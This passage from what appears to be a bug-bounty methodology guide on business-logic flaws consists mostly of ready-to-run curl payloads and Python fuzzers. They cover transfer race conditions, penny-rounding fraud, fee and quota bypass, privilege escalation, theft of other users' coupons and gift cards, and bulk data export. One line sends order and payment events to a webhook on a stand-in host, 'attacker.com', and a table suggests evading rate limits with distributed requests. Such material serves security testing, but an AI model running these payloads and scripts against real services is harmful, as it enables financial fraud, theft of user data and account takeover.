    "payment_only": true
  }'
```

### 8.2 Fintech / Payments

```bash
# Minimum transfer bypass
curl -X POST "https://target.com/api/transfers/create" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"to": "attacker", "amount": 0.01}'
# If minimum is $1, does $0.01 bypass?

# Maximum transfer bypass (chunking)
for i in $(seq 1 100); do
  curl -s -X POST "https://target.com/api/transfers/create" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"to\": \"attacker\", \"amount\": 100}" &
done
wait

# Rounding / truncation abuse
curl -X POST "https://target.com/api/transfers/create" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"to": "attacker", "amount": 0.001}'
# System truncates to 0.00? Or converts to $0.00?
# Round each transaction 0.001 down, keep the fractions -> penny fraud

# Fee bypass
curl -X POST "https://target.com/api/transfers/create" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"to": "attacker", "amount": 100, "fee": 0, "fee_type": "none"}'

# Reversal / chargeback abuse
curl -X POST "https://target.com/api/transactions/123/reverse" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"reason": "fraudulent"}'
# Does reversal return funds BEFORE checking if reversal is allowed?
# Can you reverse a transaction that was already reversed?

# Loan / credit manipulation
curl -X POST "https://target.com/api/loans/apply" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"amount": 100000, "income": 999999, "credit_score": 850}'
# Are credit checks simulated client-side?
```

### 8.3 SaaS / Subscriptions

```bash
# Feature flag manipulation
curl -X PATCH "https://target.com/api/users/me/features" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"features": ["unlimited_storage", "premium_support", "api_access", "advanced_analytics", "team_collaboration", "export_all"]}'

# Rate limit bypass
curl -X PATCH "https://target.com/api/users/me" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"rate_limit": 999999, "api_calls_per_hour": 100000}'

# Storage quota bypass
curl -X PATCH "https://target.com/api/users/me" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"storage_limit_mb": 999999, "max_file_size_mb": 999999}'

# Team member limit bypass
curl -X POST "https://target.com/api/teams/invite" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email": "user1@test.com", "plan": "free"}'
# Free plan allows 3 members. Invite 4th?

# Seat license manipulation
curl -X POST "https://target.com/api/organizations/1/seats/add" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"count": 100, "tier": "enterprise", "price_per_seat": 0}'
```

### 8.4 Gaming / Virtual Goods

```bash
# In-game currency manipulation
curl -X POST "https://target.com/api/game/currency/add" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"amount": 999999, "reason": "purchase"}'

# Loot box / reward manipulation
curl -X POST "https://target.com/api/game/rewards/claim" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"reward_id": 1, "guaranteed_item": "legendary"}'

# Leaderboard manipulation
curl -X POST "https://target.com/api/game/score/submit" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"score": -99999, "level": 1}'
# Negative score? Instant maximum score?
```

## 9. Automation Scripts

### 9.1 Business Logic Fuzzer

```python
#!/usr/bin/env python3
"""
Business Logic Vulnerability Fuzzer
Tests for price manipulation, coupon abuse, workflow bypass, and race conditions.
"""
import requests
import concurrent.futures
import json
import argparse
import urllib3
urllib3.disable_warnings()

class BizLogicFuzzer:
    def __init__(self, base_url, token):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        })
        self.findings = []

    def test_negative_values(self, endpoint, field_names, body_template):
        """Test negative, zero, and extreme values on numeric fields"""
        test_values = [-1, -99, -999999, 0, 0.001, 0.5, 99999999999, 2147483648]

        for field in field_names:
            for value in test_values:
                payload = json.loads(body_template)
                # Set the field to test value
                keys = field.split('.')
                current = payload
                for k in keys[:-1]:
                    current = current.setdefault(k, {})
                current[keys[-1]] = value

                try:
                    r = self.session.post(
                        f"{self.base_url}{endpoint}",
                        json=payload
                    )
                    # Check for unusual responses
                    if r.status_code in [200, 201, 202]:
                        print(f"[?] {field}={value} -> {r.status_code}")
                        print(f"    Response: {r.text[:200]}")
                        self.findings.append({
                            "field": field,
                            "value": value,
                            "endpoint": endpoint,
                            "status": r.status_code
                        })
                except Exception as e:
                    print(f"[-] Error: {e}")

    def test_workflow_skip(self, flows):
        """Test skipping steps in multi-step workflows"""
        for flow_name, steps in flows.items():
            print(f"\n[*] Testing flow: {flow_name}")
            for i in range(1, len(steps)):
                # Try navigating to step i+1 directly (skipping step i)
                try:
                    r = self.session.get(f"{self.base_url}{steps[i]}")
                    if r.status_code == 200:
                        print(f"[!] Step skip: {steps[i]} accessible directly!")
                        print(f"    Flow: {flow_name}, Skipped: {steps[i-1]}")
                        self.findings.append({
                            "type": "workflow_skip",
                            "flow": flow_name,
                            "direct_access": steps[i],
                            "skipped": steps[i-1]
                        })
                except:
                    pass

    def test_race_condition(self, endpoint, method="POST", body=None, count=30):
        """Test race condition on an endpoint"""
        print(f"\n[*] Race testing: {endpoint} x{count}")

        def send_request():
            if method == "POST":
                return self.session.post(f"{self.base_url}{endpoint}", json=body)
            elif method == "PUT":
                return self.session.put(f"{self.base_url}{endpoint}", json=body)
            elif method == "DELETE":
                return self.session.delete(f"{self.base_url}{endpoint}")

        with concurrent.futures.ThreadPoolExecutor(max_workers=count) as executor:
            futures = [executor.submit(send_request) for _ in range(count)]
            concurrent.futures.wait(futures)

        # Check for duplicate successes
        success_count = sum(1 for f in futures if f.result().status_code in [200, 201])
        print(f"[*] Successful responses: {success_count}/{count}")
        if success_count > 1:
            print(f"[!] Possible race condition: {success_count}/{count} succeeded")
            self.findings.append({
                "type": "race_condition",
                "endpoint": endpoint,
                "success_count": success_count,
                "total": count
            })

    def test_coupon_stacking(self, codes):
        """Test coupon stacking and multiple uses"""
        print(f"\n[*] Testing coupon stacking...")
        for code in codes:
            r = self.session.post(
                f"{self.base_url}/api/coupon/apply",
                json={"code": code}
            )
            print(f"    Applied {code}: {r.status_code} {r.text[:100]}")

        # Check final total
        r = self.session.get(f"{self.base_url}/api/cart/total")
        print(f"    Final total: {r.text[:200]}")

    def report(self, output="bizlogic_findings.json"):
        with open(output, 'w') as f:
            json.dump(self.findings, f, indent=2)
        print(f"\n[+] {len(self.findings)} findings written to {output}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--token", required=True)
    args = parser.parse_args()

    fuzzer = BizLogicFuzzer(args.url, args.token)

    # Price manipulation tests
    fuzzer.test_negative_values(
        "/api/cart/add",
        ["quantity", "price", "discount"],
        '{"product_id": 1, "quantity": 1, "price": 100}'
    )

    # Workflow bypass tests
    fuzzer.test_workflow_skip({
        "checkout": ["/cart", "/shipping", "/payment", "/confirm", "/done"],
        "registration": ["/register", "/verify-email", "/profile-setup", "/welcome"]
    })

    # Race condition tests
    fuzzer.test_race_condition(
        "/api/wallet/withdraw",
        body={"amount": 1}
    )

    # Coupon stacking
    fuzzer.test_coupon_stacking(["SUMMER20", "WELCOME10", "VIP50"])

    fuzzer.report()
```

### 9.2 State Machine Fuzzer (Python)

```python
#!/usr/bin/env python3
"""
State machine fuzzer for discovering hidden transitions.
Tests every combination of states, statuses, and step transitions.
"""
import requests
import itertools

def fuzz_state_machine(base_url, token, initial_state, endpoints):
    session = requests.Session()
    session.headers.update({"Authorization": f"Bearer {token}"})

    state = initial_state
    transitions_tried = set()

    for endpoint, method, state_field, values in endpoints:
        for value in values:
            key = (endpoint, str(value))
            if key in transitions_tried:
                continue
            transitions_tried.add(key)

            payload = {state_field: value}

            try:
                if method == "PATCH":
                    r = session.patch(f"{base_url}{endpoint}", json=payload)
                elif method == "PUT":
                    r = session.put(f"{base_url}{endpoint}", json=payload)
                elif method == "POST":
                    r = session.post(f"{base_url}{endpoint}", json=payload)

                print(f"[*] {method} {endpoint} {state_field}={value} -> {r.status_code}")

                if r.status_code in [200, 201, 202]:
                    print(f"    Response: {r.text[:150]}")

                    # Check for unexpected privilege changes
                    if any(w in r.text.lower() for w in ['admin', 'premium', 'elevated']):
                        print(f"[!] Possible privilege escalation via {state_field}={value}")

                    # Check for state changes that shouldn't be possible
                    me = session.get(f"{base_url}/api/users/me").json()
                    if me.get(state_field) == value:
                        print(f"[!] State change accepted: {state_field} -> {value}")
                        state = value

            except Exception as e:
                print(f"[-] Error: {e}")

# Usage:
# fuzz_state_machine("https://target.com", "TOKEN",
#     {"plan": "free", "status": "active"},
#     [
#         ("/api/users/me", "PATCH", "plan", ["free", "premium", "enterprise", "unlimited"]),
#         ("/api/users/me", "PATCH", "status", ["active", "suspended", "cancelled", "deleted"]),
#         ("/api/users/me", "PATCH", "role", ["user", "admin", "moderator", "super_admin"]),
#         ("/api/subscriptions/plan", "POST", "plan", ["free", "premium", "enterprise"]),
#     ]
# )
```

## 10. Real-World Case Studies

### 10.1 Shopify Partners — Mass Assignment to Admin (2018)

The Shopify Partners program had a registration endpoint that accepted role parameters. By adding `{"role": "admin"}` to the signup request, new users became admins. ~$30,000 bounty.

### 10.2 GitLab — IDOR Write + Mass Assignment

GitLab had a mass assignment vulnerability via the `assign_issues` API. Users could modify issue attributes including milestone, weight, and due_date on issues they didn't own by sending a PUT request with target issue IDs. Combined with IDOR on project membership, this allowed privilege escalation.

### 10.3 Coinbase — Race Condition in Credit Card Add

Multiple simultaneous requests to add the same credit card resulted in the card being verified once but credited multiple times. ~$5,000 bounty.

### 10.4 Uber — Coupon Race Condition

Uber's promo code redemption endpoint was vulnerable to race conditions. By sending multiple simultaneous redemption requests, a single-use promo code could be applied multiple times, resulting in unlimited free rides.

### 10.5 HackerOne Program — Referral Abuse

A private program's referral system allowed unlimited referrals. An attacker created 10,000 fake accounts via temporary email and collected $50,000+ in referral credits before the flaw was discovered.

### 10.6 Fintech — Negative Balance + Transfer Race

A fintech app allowed transfers up to the account balance. By sending multiple transfer requests simultaneously, a user with $100 could transfer $100 to 10 different accounts simultaneously. The balance check passed for all 10 requests before the deduction was applied. The attacker extracted $1,000 from a $100 balance. $15,000 bounty.

### 10.7 E-Commerce — Coupon Stacking Payout

An e-commerce platform had a coupon stacking bug where each coupon was applied as a percentage of the original price (not the discounted price). Stacking 20 coupons at 10% each: 100%+ discount. Orders were fulfilled before the bug was caught.

## 11. False Positive Filter

| Behavior | Likely False Positive | Real Finding |
|----------|----------------------|--------------|
| Price reverts after page reload | Client-side only manipulation | Server accepted but recalculated |
| Coupon code unknown | Just testing wrong codes | Need to find valid codes first |
| 403 on workflow step | Step requires auth | Can you access with different method/header? |
| Order created at $0 | Could be a test/development order | Check if real inventory was deducted |
| Rate limit kicks in | You're being blocked | Log the rate limit, try distributed approach |
| Coupon shows applied but no discount | Visual bug only | Check the actual payment request |
| 2FA bypass works only once | Timing-dependent | Try multiple times, document success rate |

## 12. Impact Escalation

| Finding | Base | Chain To | Final |
|---------|------|----------|-------|
| Negative quantity | High | Checkout | Critical - items for free |
| Coupon race condition | High | Multiple use | Critical - unlimited discount |
| 2FA skip | High | ATO | Critical - full account takeover |
| Workflow skip | Medium | Payment bypass | Critical - free orders |
| Price override | High | Checkout | Critical - arbitrary pricing |
| State manipulation | Medium | Status change | High - unauthorized actions |
| Referral abuse | Medium | Mass fraud | High - financial loss |
| Account merge | High | ATO | Critical - account takeover |
| Integer overflow | Medium | Price $0 | High - free items |
| Currency confusion | Medium | Large discount | High - financial loss |

## 13. Edge Cases That Keep Paying Bounties

### 13.1 Type Coercion

Sending the wrong data type can bypass validation:

```bash
# String instead of number
curl -X POST "https://target.com/api/cart/add" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1, "quantity": "one", "price": "free"}'

# Boolean instead of number
curl -X POST "https://target.com/api/cart/add" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1, "quantity": true, "price": false}'

# Array instead of object
curl -X POST "https://target.com/api/orders/create" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"items": [[1, {"quantity": -1, "price": 999}], [2, {"quantity": 1, "price": 999}]]}'

# Null values
curl -X POST "https://target.com/api/cart/add" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1, "quantity": null, "price": null}'

# Empty strings
curl -X POST "https://target.com/api/coupon/apply" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code": ""}'

# Very long strings (overflow / truncation)
curl -X POST "https://target.com/api/coupon/apply" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}'
```

### 13.2 IDOR + Business Logic Combo

```bash
# Apply someone else's coupon to your account
curl -X POST "https://target.com/api/coupon/apply" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code": "VICTIM-COUPON-CODE", "user_id": "my_id"}'

# Transfer another user's loyalty points
curl -X POST "https://target.com/api/loyalty/transfer" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"from_user": 1043, "to_user": 1042, "points": 50000}'

# Use another user's gift card
curl -X POST "https://target.com/api/gift-card/redeem" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code": "VICTIM-GIFT-CODE", "apply_to": "my_account"}'
```

### 13.3 Webhook / Callback Manipulation

```bash
# Webhook delivery can be exploited for SSRF or data access
curl -X POST "https://target.com/api/webhooks/create" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "https://attacker.com/webhook", "events": ["order.created", "user.updated", "payment.received"]}'

# If webhook events include sensitive data, does the webhook include other users' data?
# Test: create webhook, trigger event, check what data is delivered
# "order.created" -> does it include ALL orders or just yours?
```

### 13.4 Export / Data Dump Abuse

```bash
# Scheduled exports may include other users' data
curl -X POST "https://target.com/api/exports/create" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "format": "csv",
    "scope": "all_users",
    "fields": ["email", "name", "address", "payment_info"],
    "schedule": "once"
  }'

# Export with date range that includes data before your account existed
curl -X POST "https://target.com/api/exports/create" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"format": "json", "date_from": "2020-01-01", "date_to": "2025-12-31"}'

# Export with admin scope
curl -X POST "https://target.com/api/exports/create" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"scope": "admin", "include_all_tenants": true}'
```

### 13.5 Pagination / Limits Abuse

```bash
# No-limit pagination — dump entire dataset
curl "https://target.com/api/users?page=1&per_page=100" -H "Authorization: Bearer $TOKEN"
curl "https://target.com/api/users?page=2&per_page=100" -H "Authorization: Bearer $TOKEN"
curl "https://target.com/api/users?page=3&per_page=100" -H "Authorization: Bearer $TOKEN"

# Request maximum per_page
curl "https://target.com/api/users?per_page=999999" -H "Authorization: Bearer $TOKEN"
curl "https://target.com/api/users?limit=999999" -H "Authorization: Bearer $TOKEN"
curl "https://target.com/api/users?count=999999" -H "Authorization: Bearer $TOKEN"

# Negative pagination (off-by-one errors)
curl "https://target.com/api/users?page=-1" -H "Authorization: Bearer $TOKEN"
curl "https://target.com/api/users?offset=-1" -H "Authorization: Bearer $TOKEN"
curl "https://target.com/api/users?page=0" -H "Authorization: Bearer $TOKEN"
```

## 14. Methodology Summary

### 14.1 Quick Reference Card

```
1. Map every multi-step workflow (checkout, register, 2FA, sub, referral, export)
2. Skip each step — navigate directly to the final destination
3. Send every numeric field as: negative, zero, decimal, overflow, null
4. Race every financial operation (20-30 parallel requests)
5. Stack every coupon/discount offered
6. Try expired/someone else's/fake coupons
7. Change every status/state to every possible value
8. Add every admin/privilege field to every request
9. Manipulate currency, test cards, ship-to addresses
10. Repeat entire flow backward (complete, then try to undo)
```

### 14.2 Priority Order

1. **Financial** — checkout, payment, refund, transfer, coupon, wallet (highest bounty)
2. **Auth** — 2FA, password reset, email change, account merge (high impact)
3. **Privilege** — role change, plan upgrade, feature access (escalation)
4. **Operational** — status manipulation, workflow skip, approval bypass
5. **Data** — export, pagination, webhook, notification (exfiltration)
6. **Abuse** — referral, trial, rate limit, review spam (nuisance but pays)
ENDOFFILE
```
